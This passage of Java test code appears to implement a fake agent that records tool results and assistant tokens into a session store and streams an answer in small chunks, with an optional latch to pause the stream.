                        case AgentEvent.ToolResult r -> sessions.appendMessage(sessionId, ToolResponseMessage.builder()
                                .responses(List.of(new ToolResponseMessage.ToolResponse(r.id(), r.name(), r.output())))
                                .build());
                        case AgentEvent.Token t -> sessions.appendMessage(sessionId, new AssistantMessage(t.text()));
                        default -> { }
                    }
                    events.accept(event);
                }
                for (int i = 0; i < answer.length(); i += 3) {
                    events.accept(new AgentEvent.Token(answer.substring(i, Math.min(answer.length(), i + 3))));
                    CountDownLatch gate = hold;
                    if (i == 0 && gate != null) {
                        try {
                            gate.await(30, TimeUnit.SECONDS);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }
                sessions.appendMessage(sessionId, new AssistantMessage(answer));
                events.accept(new AgentEvent.Done());
                finished.countDown();
            }

            @Override
            public <T> T prompt(AgentRequest request, Class<T> result) {
                return null;
            }
        }
    }
}
